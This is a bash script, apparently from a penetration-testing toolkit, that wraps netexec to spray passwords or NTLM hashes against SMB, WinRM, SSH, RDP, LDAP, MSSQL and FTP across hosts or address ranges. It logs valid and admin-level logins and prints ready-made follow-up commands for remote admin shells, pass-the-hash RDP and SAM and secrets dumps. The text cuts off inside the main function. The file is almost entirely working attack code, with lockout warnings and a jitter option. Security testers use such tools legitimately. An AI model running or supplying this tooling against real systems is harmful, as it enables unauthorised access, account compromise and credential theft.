#!/usr/bin/env bash
#==============================================================================
# sprayr.sh — Multi-Protocol Credential Spray Wrapper
#==============================================================================
# OffSec-focused. Authentication testing only — no command execution.
# Tests a credential (user/pass or user/hash) against every relevant service
# on one or more targets in parallel. Prints hits immediately.
#
# USAGE:
#   ./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10
#   ./sprayr.sh -U users.txt -p 'Password123!' -t 192.168.1.0/24
#   ./sprayr.sh -u administrator -H fc525c9683e8fe067095ba2ddc971889 -t 192.168.1.10
#   ./sprayr.sh -u admin -p 'Pass' -d corp.local -t 192.168.1.10 --proto smb,winrm
#   ./sprayr.sh -U users.txt -p 'Pass' -t 192.168.1.10 --safe --quick
#==============================================================================

set -o pipefail
# NOT set -e: one protocol failure must not abort others
# NOT set -u: optional variables must be safe to reference unset

#------------------------------------------------------------------------------
# COLORS & LOGGING (matches toolkit exactly)
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

ts()      { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*" >&2; }
phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }
cmd_log() { echo -e "${CYAN}[$(ts)] [CMD]${NC} $*"; }
hit_admin() { echo -e "${GREEN}${BOLD}[$(ts)] [+] ★ ADMIN HIT:${NC}${GREEN}${BOLD} $*${NC}"; }

#------------------------------------------------------------------------------
# GLOBAL STATE
#------------------------------------------------------------------------------
AUTH_USER=""          # single username
AUTH_USER_FILE=""     # user file path
AUTH_PASS=""          # plaintext password
AUTH_HASH_RAW=""      # raw hash input
NT_HASH=""            # normalized NT hash (32 hex chars)
LM_NT_HASH=""         # normalized LM:NT format
AUTH_TYPE=""          # "password" | "hash"
DOMAIN=""
LOCAL_AUTH=false
TARGETS_RAW=""        # raw target string (comma-sep IPs/CIDR)
TARGET_FILE=""        # target file path
PROTO_LIST=""         # comma-separated protocols to use
QUICK_MODE=false
SAFE_MODE=false
THREADS=20
PROTO_TIMEOUT=30
OUTDIR=""

# Runtime state (set during main)
RESOLVED_TARGETS_FILE=""    # temp file: one target per line
IS_RANGE_TARGET=false       # true if any target is CIDR/range
CRED_DISPLAY=""             # e.g. "admin:Password1" or "admin:<hash>"

# Protocol → default port mapping
declare -A PROTO_PORTS=(
    [smb]=445
    [winrm]=5985
    [ssh]=22
    [rdp]=3389
    [ldap]=389
    [mssql]=1433
    [ftp]=21
)

# Protocols that do NOT support hash auth (NTLM)
declare -A PROTO_NO_HASH=(
    [ssh]=1
    [ftp]=1
)

# Default protocol order (quick = smb only)
DEFAULT_PROTOS="smb winrm ssh rdp ldap mssql ftp"
QUICK_PROTOS="smb"

# Child PIDs for cleanup
declare -a CHILD_PIDS=()

#------------------------------------------------------------------------------
# CLEANUP TRAP
#------------------------------------------------------------------------------
cleanup() {
    echo ""
    warn "Interrupted — killing background spray jobs..."
    local pid
    for pid in "${CHILD_PIDS[@]}"; do
        kill -TERM "$pid" 2>/dev/null || true
    done
    sleep 1
    for pid in "${CHILD_PIDS[@]}"; do
        kill -9 "$pid" 2>/dev/null || true
    done
    [[ -n "$RESOLVED_TARGETS_FILE" ]] && rm -f "$RESOLVED_TARGETS_FILE" 2>/dev/null || true
    if [[ -n "$OUTDIR" ]]; then
        warn "Partial results saved to ${OUTDIR}/"
        generate_summary
    fi
    exit 130
}

trap cleanup INT TERM

#------------------------------------------------------------------------------
# VALIDATION & NORMALIZATION
#------------------------------------------------------------------------------
is_cidr_or_range() {
    # CIDR: contains /
    # IP range: digit-digit pattern (192.168.1.1-10), not hostname dashes (dc-01)
    [[ "$1" =~ / ]] || [[ "$1" =~ [0-9]-[0-9] ]]
}

is_valid_ntlm() {
    [[ "$1" =~ ^[A-Fa-f0-9]{32}$ ]]
}

normalize_hash() {
    # Accepts: :NTHASH | LMHASH:NTHASH | plain NTHASH
    # Sets globals NT_HASH and LM_NT_HASH, returns 1 on bad format
    local raw="$1"
    local nt
    if [[ "$raw" == :* ]]; then
        nt="${raw#:}"
    elif [[ "$raw" == *:* ]]; then
        local lm="${raw%%:*}"
        is_valid_ntlm "$lm" || return 1
        nt="${raw##*:}"
    else
        nt="$raw"
    fi
    is_valid_ntlm "$nt" || return 1
    NT_HASH="$nt"
    LM_NT_HASH="aad3b435b51404eeaad3b435b51404ee:${nt}"
}

is_positive_integer() { [[ "$1" =~ ^[1-9][0-9]*$ ]]; }

#------------------------------------------------------------------------------
# PORT PROBE (injection-safe /dev/tcp pattern)
#------------------------------------------------------------------------------
port_open() {
    local host="$1"
    local port="$2"
    # shellcheck disable=SC2016
    timeout 3 bash -c '>/dev/tcp/$1/$2' bash "$host" "$port" 2>/dev/null
}

output_indicates_auth_failure() {
    local raw_file="$1"
    grep -qiE 'STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|STATUS_ACCOUNT_RESTRICTION|invalid credentials|login failed|authentication failed|unauthorized' "$raw_file" 2>/dev/null
}

#------------------------------------------------------------------------------
# HIT RECORDING (atomic append — survives Ctrl+C)
#------------------------------------------------------------------------------
# hits.txt format: PROTO|TARGET|CRED|PWND_FLAG
# pwnd.txt: admin-level hits only

record_hit() {
    local proto="$1"
    local target="$2"
    local is_pwnd="$3"    # "pwnd" | "hit"
    local cred="$4"

    local proto_upper
    proto_upper=$(echo "$proto" | tr '[:lower:]' '[:upper:]')
    local display="${proto_upper} | ${target} | ${cred}"

    if [[ "$is_pwnd" == "pwnd" ]]; then
        echo "${proto}|${target}|${cred}|PWND" >> "${OUTDIR}/hits.txt"
        echo "${proto}|${target}|${cred}|PWND" >> "${OUTDIR}/pwnd.txt"
        hit_admin "${display} (Pwn3d!)"
    else
        echo "${proto}|${target}|${cred}|HIT" >> "${OUTDIR}/hits.txt"
        success "HIT: ${display}"
    fi
}

record_miss() {
    local proto="$1"
    local target="$2"
    local reason="$3"
    echo -e "${RED}[$(ts)] [-]${NC} MISS: $(echo "$proto" | tr '[:lower:]' '[:upper:]') | ${target} | ${reason}"
}

record_skip() {
    local proto="$1"
    local target="$2"
    local reason="$3"
    warn "SKIP: $(echo "$proto" | tr '[:lower:]' '[:upper:]') | ${target} (${reason})"
}

credential_display_for_user() {
    local user_name="$1"

    if [[ -z "$user_name" ]]; then
        echo "$CRED_DISPLAY"
    elif [[ "$AUTH_TYPE" == "hash" ]]; then
        echo "${user_name}:<${NT_HASH:0:8}...>"
    else
        echo "${user_name}:${AUTH_PASS}"
    fi
}

extract_success_user() {
    local line="$1"

    if [[ "$line" =~ \\([^\\[:space:]:]+): ]]; then
        echo "${BASH_REMATCH[1]}"
        return 0
    fi

    if [[ "$line" =~ \[\+\][[:space:]]+([^[:space:]:]+): ]]; then
        echo "${BASH_REMATCH[1]}"
        return 0
    fi

    return 1
}

#------------------------------------------------------------------------------
# PARSE NXC OUTPUT FOR HITS
#------------------------------------------------------------------------------
parse_nxc_output() {
    local proto="$1"
    local raw_file="$2"

    [[ -f "$raw_file" ]] || return 0

    local line target hit_user cred_display
    while IFS= read -r line; do
        # Extract IP — second whitespace field in nxc output:
        # "SMB  10.10.10.5  445  DC01  [+] ..."
        target=$(echo "$line" | awk '{print $2}')
        [[ -z "$target" ]] && continue

        hit_user=""
        if [[ -n "$AUTH_USER_FILE" ]]; then
            hit_user=$(extract_success_user "$line" || true)
        fi
        cred_display=$(credential_display_for_user "$hit_user")

        if [[ "$line" == *"(Pwn3d!)"* ]]; then
            record_hit "$proto" "$target" "pwnd" "$cred_display"
        else
            record_hit "$proto" "$target" "hit" "$cred_display"
        fi
    done < <(grep -F '[+]' "$raw_file" 2>/dev/null || true)
}

#------------------------------------------------------------------------------
# BUILD NXC AUTH ARGS
#------------------------------------------------------------------------------
build_nxc_auth_args() {
    # Outputs to NXC_AUTH_ARGS array (caller must declare local -a first)
    local proto="$1"
    local -n _out_arr="$2"   # nameref to caller's array

    # Username/user-file
    if [[ -n "$AUTH_USER_FILE" ]]; then
        _out_arr+=(-u "$AUTH_USER_FILE")
    else
        _out_arr+=(-u "$AUTH_USER")
    fi

    # Credential: hash or password
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        # SSH and FTP do not support NTLM hash auth
        if [[ -n "${PROTO_NO_HASH[$proto]}" ]]; then
            return 1   # caller should skip this protocol
        fi
        _out_arr+=(-H "$NT_HASH")
    else
        # Handle passwords starting with '-' (use long-form with = to avoid argparse clash)
        if [[ "$AUTH_PASS" == -* ]]; then
            _out_arr+=("--password=${AUTH_PASS}")
        else
            _out_arr+=(-p "$AUTH_PASS")
        fi
    fi

    # Domain / local auth
    if [[ "$LOCAL_AUTH" == true ]]; then
        _out_arr+=(--local-auth)
    elif [[ -n "$DOMAIN" ]]; then
        _out_arr+=(-d "$DOMAIN")
    fi

    return 0
}

#------------------------------------------------------------------------------
# SPRAY ONE PROTOCOL
#------------------------------------------------------------------------------
spray_proto() {
    local proto="$1"
    local port="${PROTO_PORTS[$proto]}"
    local raw_out="${OUTDIR}/raw/${proto}_spray.txt"
    local proto_upper
    proto_upper=$(echo "$proto" | tr '[:lower:]' '[:upper:]')

    # Build nxc auth args — also checks if protocol supports hash
    local -a auth_args=()
    if ! build_nxc_auth_args "$proto" auth_args; then
        record_skip "$proto" "all targets" "NTLM hash not supported by ${proto_upper}"
        return 0
    fi

    # Build target list, checking ports if applicable
    local -a live_targets=()

    if [[ "$IS_RANGE_TARGET" == true ]]; then
        # CIDR/range — pass all as-is, nxc handles unreachable hosts
        while IFS= read -r t; do
            [[ -n "$t" ]] && live_targets+=("$t")
        done < "$RESOLVED_TARGETS_FILE"
    else
        # Single IPs — port pre-check each
        local t
        while IFS= read -r t; do
            [[ -z "$t" ]] && continue
            if port_open "$t" "$port"; then
                live_targets+=("$t")
            else
                record_skip "$proto" "$t" "port ${port} closed"
            fi
        done < "$RESOLVED_TARGETS_FILE"
    fi

    if (( ${#live_targets[@]} == 0 )); then
        info "No live ${proto_upper} targets — skipping"
        return 0
    fi

    # Assemble full nxc command
    local -a cmd=(nxc "$proto" "${live_targets[@]}" "${auth_args[@]}"
        --continue-on-success
        --no-progress
        -t "$THREADS"
        --timeout "$PROTO_TIMEOUT"
    )
    [[ "$SAFE_MODE" == true ]] && cmd+=(--jitter 2)

    info "Spraying ${proto_upper} on ${#live_targets[@]} target(s)..."
    cmd_log "${cmd[*]}"
    timeout "$(( PROTO_TIMEOUT + 10 ))" "${cmd[@]}" > "$raw_out" 2>&1 || true

    # Only call it an auth miss when the output actually indicates auth failure.
    if ! grep -qF '[+]' "$raw_out" 2>/dev/null; then
        if output_indicates_auth_failure "$raw_out"; then
            local target
            for target in "${live_targets[@]}"; do
                record_miss "$proto" "$target" "auth failed"
            done
        else
            warn "No ${proto_upper} hits and no definitive auth-failure marker — check ${raw_out}"
        fi
    fi

    parse_nxc_output "$proto" "$raw_out"
}

#------------------------------------------------------------------------------
# NEXT-STEPS GENERATION
#------------------------------------------------------------------------------
generate_next_steps() {
    local hits_file="${OUTDIR}/hits.txt"
    [[ -f "$hits_file" ]] || return 0

    local total_hits
    total_hits=$(wc -l < "$hits_file" 2>/dev/null || echo 0)
    (( total_hits == 0 )) && return 0

    local ns_file="${OUTDIR}/next_steps.txt"
    {
        echo ""
        echo "NEXT STEPS (copy-paste ready)"
        echo "────────────────────────────────────────────────────────────"

        local proto target cred flag
        local first_smb_pwnd="" first_winrm_pwnd="" first_rdp_hit="" first_ssh_hit=""
        local first_mssql_hit="" first_ldap_hit=""
        local hit_user=""

        while IFS='|' read -r proto target cred flag; do
            # Try to extract username from cred display (format: "user:pass" or "user:<hash>")
            hit_user="${cred%%:*}"

            case "${proto}${flag}" in
                smbPWND)
                    [[ -z "$first_smb_pwnd" ]] && first_smb_pwnd="${target}|${hit_user}"
                    ;;
                winrmPWND)
                    [[ -z "$first_winrm_pwnd" ]] && first_winrm_pwnd="${target}|${hit_user}"
                    ;;
                rdp*)
                    [[ -z "$first_rdp_hit" ]] && first_rdp_hit="${target}|${hit_user}"
                    ;;
                ssh*)
                    [[ -z "$first_ssh_hit" ]] && first_ssh_hit="${target}|${hit_user}"
                    ;;
                mssql*)
                    [[ -z "$first_mssql_hit" ]] && first_mssql_hit="${target}|${hit_user}"
                    ;;
                ldap*)
                    [[ -z "$first_ldap_hit" ]] && first_ldap_hit="${target}|${hit_user}"
                    ;;
            esac
        done < "$hits_file"

        # SMB admin
        if [[ -n "$first_smb_pwnd" ]]; then
            local smb_t="${first_smb_pwnd%|*}"
            local smb_u="${first_smb_pwnd##*|}"
            echo ""
            echo "# Admin shell via SMB (Pwn3d!):"
            if [[ "$AUTH_TYPE" == "hash" ]]; then
                echo "  impacket-psexec -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
                echo "  impacket-wmiexec -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
                echo "  impacket-smbexec -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
                echo ""
                echo "# SAM dump:"
                echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --sam"
                echo "  impacket-secretsdump -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
            else
                echo "  impacket-psexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
                echo "  impacket-wmiexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
                echo "  impacket-smbexec ${smb_u}:'${AUTH_PASS}'@${smb_t}"
                echo ""
                echo "# SAM dump:"
                echo "  nxc smb ${smb_t} -u ${smb_u} -p '${AUTH_PASS}' --sam"
                echo "  impacket-secretsdump ${smb_u}:'${AUTH_PASS}'@${smb_t}"
            fi
        fi

        # WinRM admin
        if [[ -n "$first_winrm_pwnd" ]]; then
            local wrm_t="${first_winrm_pwnd%|*}"
            local wrm_u="${first_winrm_pwnd##*|}"
            echo ""
            echo "# Admin shell via WinRM (Pwn3d!):"
            if [[ "$AUTH_TYPE" == "hash" ]]; then
                echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -H ${NT_HASH}"
            else
                echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -p '${AUTH_PASS}'"
            fi
        fi

        # RDP
        if [[ -n "$first_rdp_hit" ]]; then
            local rdp_t="${first_rdp_hit%|*}"
            local rdp_u="${first_rdp_hit##*|}"
            echo ""
            echo "# RDP session:"
            if [[ "$AUTH_TYPE" == "hash" ]]; then
                if [[ -n "$DOMAIN" ]]; then
                    echo "  xfreerdp3 /u:${rdp_u} /d:${DOMAIN} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
                else
                    echo "  xfreerdp3 /u:${rdp_u} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
                fi
            elif [[ -n "$DOMAIN" ]]; then
                echo "  xfreerdp3 /u:${rdp_u} /d:${DOMAIN} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
            else
                echo "  xfreerdp3 /u:${rdp_u} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
            fi
        fi

        # SSH
        if [[ -n "$first_ssh_hit" ]]; then
            local ssh_t="${first_ssh_hit%|*}"
            local ssh_u="${first_ssh_hit##*|}"
            echo ""
            echo "# SSH session:"
            echo "  ssh ${ssh_u}@${ssh_t}"
        fi

        # MSSQL
        if [[ -n "$first_mssql_hit" ]]; then
            local sql_t="${first_mssql_hit%|*}"
            local sql_u="${first_mssql_hit##*|}"
            echo ""
            echo "# MSSQL access:"
            if [[ "$AUTH_TYPE" == "hash" ]]; then
                echo "  nxc mssql ${sql_t} -u ${sql_u} -H ${NT_HASH} -q 'SELECT @@version'"
            else
                echo "  nxc mssql ${sql_t} -u ${sql_u} -p '${AUTH_PASS}' -q 'SELECT @@version'"
            fi
        fi

        # LDAP — domain creds
        if [[ -n "$first_ldap_hit" ]]; then
            local ldp_t="${first_ldap_hit%|*}"
            local ldp_u="${first_ldap_hit##*|}"
            local dom="${DOMAIN:-<DOMAIN>}"
            echo ""
            echo "# Valid domain credentials confirmed via LDAP:"
            if [[ "$AUTH_TYPE" == "hash" ]]; then
                echo "  ./adr.sh -d ${dom} -u ${ldp_u} -H :${NT_HASH} -dc ${ldp_t}"
            else
                echo "  ./adr.sh -d ${dom} -u ${ldp_u} -p '${AUTH_PASS}' -dc ${ldp_t}"
            fi
        fi

        echo ""
        echo "────────────────────────────────────────────────────────────"
    } | tee -a "$ns_file"
}

#------------------------------------------------------------------------------
# SUMMARY
#------------------------------------------------------------------------------
generate_summary() {
    local summary_file="${OUTDIR}/summary.txt"
    local hits_file="${OUTDIR}/hits.txt"

    local total_hits=0 total_pwnd=0
    [[ -f "$hits_file" ]] && total_hits=$(wc -l < "$hits_file" 2>/dev/null || echo 0)
    [[ -f "${OUTDIR}/pwnd.txt" ]] && total_pwnd=$(wc -l < "${OUTDIR}/pwnd.txt" 2>/dev/null || echo 0)

    local proto_list_display
    proto_list_display=$(echo "${ACTIVE_PROTOS[*]}" | tr ' ' ',')

    local target_count=0
    [[ -f "$RESOLVED_TARGETS_FILE" ]] && \
        target_count=$(wc -l < "$RESOLVED_TARGETS_FILE" 2>/dev/null || echo 0)

    {
        echo ""
        echo "════════════════════════════════════════════════════════════════"
        echo "  SPRAY RESULTS SUMMARY"
        echo "════════════════════════════════════════════════════════════════"
        echo "  Targets tested:  ${target_count}"
        echo "  Protocols tried: ${proto_list_display}"
        echo "  Credentials:     ${CRED_DISPLAY}"
        [[ -n "$DOMAIN" ]] && echo "  Domain:          ${DOMAIN}"
        [[ "$LOCAL_AUTH" == true ]] && echo "  Auth mode:       local"
        echo "  Total hits:      ${total_hits}"
        echo "  Admin hits:      ${total_pwnd}  ← (Pwn3d!)"
        echo ""

        if [[ "$total_hits" -gt 0 && -f "$hits_file" ]]; then
            echo "  VALID CREDENTIALS"
            echo "  ─────────────────"
            local proto target cred flag
            while IFS='|' read -r proto target cred flag; do
                local proto_u
                proto_u=$(printf '%-8s' "$(echo "$proto" | tr '[:lower:]' '[:upper:]')")
                if [[ "$flag" == "PWND" ]]; then
                    echo "  ★ ${proto_u}| ${target} | ${cred} (Pwn3d!)"
                else
                    echo "    ${proto_u}| ${target} | ${cred}"
                fi
            done < "$hits_file"
        else
            echo "  NO VALID CREDENTIALS FOUND"
            echo ""
            echo "  Troubleshooting:"
            echo "    - Verify password/hash is correct"
            echo "    - Check lockout policy before retrying (use --safe for jitter)"
            echo "    - Try --local-auth if domain auth failing"
            echo "    - Verify target reachability: ping / nmap -sn"
            echo "    - Check adr.sh output for correct domain name"
        fi

        echo ""
        echo "  Output directory: ${OUTDIR}/"
        echo "  Raw nxc output:   ${OUTDIR}/raw/"
        echo "════════════════════════════════════════════════════════════════"
    } | tee "$summary_file"
}

#------------------------------------------------------------------------------
# TOOL CHECK
#------------------------------------------------------------------------------
check_tools() {
    if ! command -v nxc &>/dev/null; then
        error "nxc (netexec) not found. Install: sudo apt install netexec"
        exit 1
    fi
}

#------------------------------------------------------------------------------
# HELP
#------------------------------------------------------------------------------
show_help() {
    cat <<'EOF'

sprayr.sh — Multi-Protocol Credential Spray Wrapper
OffSec-focused. Authentication testing only — no command execution.

USAGE:
  ./sprayr.sh -u USER     -p PASS  -t TARGET [OPTIONS]
  ./sprayr.sh -U users.txt -p PASS  -t TARGET [OPTIONS]
  ./sprayr.sh -u USER     -H HASH  -t TARGET [OPTIONS]

AUTHENTICATION:
  -u, --user USER         Single username
  -U, --user-file FILE    File with usernames (one per line)
  -p, --password PASS     Plaintext password
  -H, --hash HASH         NTLM hash (NT-only, :NT, or LM:NT format)
  -d, --domain DOMAIN     Domain name (for domain auth)
  --local-auth            Local authentication (no domain)

TARGETS:
  -t, --targets TARGETS   Comma-separated IPs, CIDR, or single IP
  -T, --target-file FILE  File with targets (one per line)

OPTIONS:
  --proto LIST            Comma-separated protocols (default: all)
                          Available: smb, winrm, ssh, rdp, ldap, mssql, ftp
  --quick                 SMB only — fastest validation
  --safe                  Add 2s jitter between attempts (lockout safety)
  --threads N             nxc thread count (default: 20)
  --timeout N             Per-protocol timeout seconds (default: 30)
  --outdir DIR            Output directory (default: ./spray/<timestamp>/)
  -h, --help              This help

EXAMPLES:
  # Validate a cracked password against all protocols
  ./sprayr.sh -u administrator -p 'Password123!' -t 192.168.1.10

  # Spray user list (domain)
  ./sprayr.sh -U users.txt -p 'Welcome1' -d corp.local -t 192.168.1.0/24

  # Pass-the-hash validation
  ./sprayr.sh -u administrator -H fc525c9683e8fe067095ba2ddc971889 -t 192.168.1.10

  # SMB only, local auth
  ./sprayr.sh -u admin -p 'Pass' --local-auth -t 192.168.1.10 --quick

  # Safe spray with jitter (lockout-conscious)
  ./sprayr.sh -U users.txt -p 'Summer2024!' -d corp.local -t 192.168.1.10 --safe

  # Specific protocols
  ./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --proto smb,winrm,ldap

NOTES:
  - Hash auth: SSH and FTP do not support NTLM — auto-skipped
  - (Pwn3d!) = local admin access on that host
  - Use --safe when spraying domain accounts (prevents lockouts)
  - Check adr.sh output for password policy before domain sprays
  - hits.txt and pwnd.txt are written atomically — survive Ctrl+C

EOF
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    if [[ $# -eq 0 ]]; then
        show_help
        exit 0
    fi

    # Argument parsing
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--user)
                [[ $# -lt 2 ]] && { error "--user requires an argument"; exit 1; }
                AUTH_USER="$2"; shift 2 ;;
            -U|--user-file)
                [[ $# -lt 2 ]] && { error "--user-file requires an argument"; exit 1; }
                AUTH_USER_FILE="$2"; shift 2 ;;
            -p|--password)
                [[ $# -lt 2 ]] && { error "--password requires an argument"; exit 1; }
                AUTH_PASS="$2"; AUTH_TYPE="password"; shift 2 ;;
            -H|--hash)
                [[ $# -lt 2 ]] && { error "--hash requires an argument"; exit 1; }
                AUTH_HASH_RAW="$2"; AUTH_TYPE="hash"; shift 2 ;;
            -d|--domain)
                [[ $# -lt 2 ]] && { error "--domain requires an argument"; exit 1; }
                DOMAIN="$2"; shift 2 ;;
            --local-auth)
                LOCAL_AUTH=true; shift ;;
            -t|--targets)
                [[ $# -lt 2 ]] && { error "--targets requires an argument"; exit 1; }
                TARGETS_RAW="$2"; shift 2 ;;
            -T|--target-file)
                [[ $# -lt 2 ]] && { error "--target-file requires an argument"; exit 1; }
                TARGET_FILE="$2"; shift 2 ;;
            --proto)
                [[ $# -lt 2 ]] && { error "--proto requires an argument"; exit 1; }
                PROTO_LIST="$2"; shift 2 ;;
            --quick)
                QUICK_MODE=true; shift ;;
            --safe)
                SAFE_MODE=true; shift ;;
            --threads)
                [[ $# -lt 2 ]] && { error "--threads requires an argument"; exit 1; }
                THREADS="$2"; shift 2 ;;
            --timeout)
                [[ $# -lt 2 ]] && { error "--timeout requires an argument"; exit 1; }
                PROTO_TIMEOUT="$2"; shift 2 ;;
            --outdir)
                [[ $# -lt 2 ]] && { error "--outdir requires an argument"; exit 1; }
                OUTDIR="$2"; shift 2 ;;
            -h|--help)
                show_help; exit 0 ;;
            *)
                error "Unknown option: $1"
                show_help
                exit 1 ;;
        esac
    done

    #--- Validate inputs -------------------------------------------------------
    # User
    if [[ -z "$AUTH_USER" && -z "$AUTH_USER_FILE" ]]; then
        error "One of -u/--user or -U/--user-file is required"
        exit 1
    fi
    if [[ -n "$AUTH_USER" && -n "$AUTH_USER_FILE" ]]; then
        error "-u and -U are mutually exclusive"
        exit 1
    fi
    if [[ -n "$AUTH_USER_FILE" && ! -f "$AUTH_USER_FILE" ]]; then
        error "User file not found: ${AUTH_USER_FILE}"
        exit 1
    fi

    # Credential
    [[ -z "$AUTH_TYPE" ]] && { error "One of -p/--password or -H/--hash is required"; exit 1; }
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        normalize_hash "$AUTH_HASH_RAW" || {
            error "Invalid hash format: ${AUTH_HASH_RAW}"
            error "Expected NT hash (32 hex chars), :NTHASH, or LMHASH:NTHASH"
            exit 1
        }
    fi

    # Domain and local-auth mutual exclusion
    if [[ "$LOCAL_AUTH" == true && -n "$DOMAIN" ]]; then
        error "--local-auth and -d/--domain are mutually exclusive"
        exit 1
    fi

    # Targets
    if [[ -z "$TARGETS_RAW" && -z "$TARGET_FILE" ]]; then
        error "One of -t/--targets or -T/--target-file is required"
        exit 1
    fi
    if [[ -n "$TARGET_FILE" && ! -f "$TARGET_FILE" ]]; then
        error "Target file not found: ${TARGET_FILE}"
        exit 1
    fi

    # Numeric validation
    is_positive_integer "$THREADS" || { error "Invalid thread count: ${THREADS}"; exit 1; }
    is_positive_integer "$PROTO_TIMEOUT" || { error "Invalid timeout: ${PROTO_TIMEOUT}"; exit 1; }

    #--- Tool check ------------------------------------------------------------
    check_tools

    #--- Resolve targets into temp file ----------------------------------------
    RESOLVED_TARGETS_FILE=$(mktemp /tmp/sprayr_targets.XXXXXX)
    trap 'rm -f "$RESOLVED_TARGETS_FILE"' EXIT

    IS_RANGE_TARGET=false

    if [[ -n "$TARGET_FILE" ]]; then
        grep -vE '^\s*#|^\s*$' "$TARGET_FILE" > "$RESOLVED_TARGETS_FILE" 2>/dev/null || true
    fi

    if [[ -n "$TARGETS_RAW" ]]; then
        local IFS=','
        local tgt
        for tgt in $TARGETS_RAW; do
            tgt="${tgt// /}"   # strip spaces
            [[ -n "$tgt" ]] && echo "$tgt" >> "$RESOLVED_TARGETS_FILE"
        done
    fi

    if [[ ! -s "$RESOLVED_TARGETS_FILE" ]]; then
        error "No valid targets found"
        exit 1
    fi

    # Detect if any target is CIDR/range (skip per-target port checks)
    local t
    while IFS= read -r t; do
        if is_cidr_or_range "$t"; then
            IS_RANGE_TARGET=true
            break
        fi
    done < "$RESOLVED_TARGETS_FILE"

    #--- Determine protocol list -----------------------------------------------
    declare -ga ACTIVE_PROTOS=()
    if [[ "$QUICK_MODE" == true ]]; then
        read -ra ACTIVE_PROTOS <<< "$QUICK_PROTOS"
    elif [[ -n "$PROTO_LIST" ]]; then
        local IFS=','
        local p
        for p in $PROTO_LIST; do
            p="${p// /}"
            if [[ -z "${PROTO_PORTS[$p]+x}" ]]; then
                error "Unknown protocol: ${p}. Valid: smb winrm ssh rdp ldap mssql ftp"
                exit 1
            fi
            ACTIVE_PROTOS+=("$p")
        done
    else
        read -ra ACTIVE_PROTOS <<< "$DEFAULT_PROTOS"
    fi

    #--- Set output directory --------------------------------------------------
    if [[ -z "$OUTDIR" ]]; then
        OUTDIR="./spray/$(date '+%Y%m%d_%H%M%S')"
    fi
    mkdir -p -- "${OUTDIR}/raw" || { error "Cannot create output directory: ${OUTDIR}"; exit 1; }

    # Initialize hit files (empty, for atomic appends)
    : > "${OUTDIR}/hits.txt"
    : > "${OUTDIR}/pwnd.txt"

    #--- Build credential display string ---------------------------------------
    local user_display
    if [[ -n "$AUTH_USER_FILE" ]]; then
        user_display="[$(wc -l < "$AUTH_USER_FILE") users from $(basename "$AUTH_USER_FILE")]"
    else
        user_display="$AUTH_USER"
    fi

    if [[ "$AUTH_TYPE" == "hash" ]]; then
        CRED_DISPLAY="${user_display}:<${NT_HASH:0:8}...>"
    else
        CRED_DISPLAY="${user_display}:${AUTH_PASS}"
    fi

    #--- Banner ----------------------------------------------------------------
    local target_count
    target_count=$(wc -l < "$RESOLVED_TARGETS_FILE")

    echo ""
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  sprayr.sh — Credential Spray${NC}"
    echo -e "${BOLD}${CYAN}  Targets:    ${target_count} host(s)${NC}"
    echo -e "${BOLD}${CYAN}  Protocols:  ${ACTIVE_PROTOS[*]}${NC}"
    echo -e "${BOLD}${CYAN}  Credential: ${CRED_DISPLAY}${NC}"
    [[ -n "$DOMAIN" ]] && echo -e "${BOLD}${CYAN}  Domain:     ${DOMAIN}${NC}"
    [[ "$LOCAL_AUTH" == true ]] && echo -e "${BOLD}${CYAN}  Auth:       local${NC}"
    [[ "$SAFE_MODE" == true ]]  && echo -e "${BOLD}${YELLOW}  Mode:       SAFE (sequential + jitter enabled)${NC}"
    [[ "$QUICK_MODE" == true ]] && echo -e "${BOLD}${YELLOW}  Mode:       QUICK (SMB only)${NC}"
    echo -e "${BOLD}${CYAN}  Output:     ${OUTDIR}/${NC}"
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""

    #--- Domain spray lockout warning ------------------------------------------
    if [[ -n "$DOMAIN" && -n "$AUTH_USER_FILE" ]]; then
        warn "DOMAIN SPRAY ACTIVE — verify lockout policy before proceeding!"
        warn "Use adr.sh to check: ./adr.sh -d ${DOMAIN} ... --quick"
        warn "Use --safe to run protocols sequentially with jitter"
        echo ""
    fi

    #--- Launch sprays ---------------------------------------------------------
    if [[ "$SAFE_MODE" == true ]]; then
        phase "Spraying ${#ACTIVE_PROTOS[@]} protocol(s) sequentially (safe mode)"
        local proto
        for proto in "${ACTIVE_PROTOS[@]}"; do
            spray_proto "$proto"
        done
    else
        phase "Spraying ${#ACTIVE_PROTOS[@]} protocol(s) in parallel"

        local proto pid
        for proto in "${ACTIVE_PROTOS[@]}"; do
            spray_proto "$proto" &
            pid=$!
            CHILD_PIDS+=("$pid")
        done

        # Wait for all spray jobs
        for pid in "${CHILD_PIDS[@]}"; do
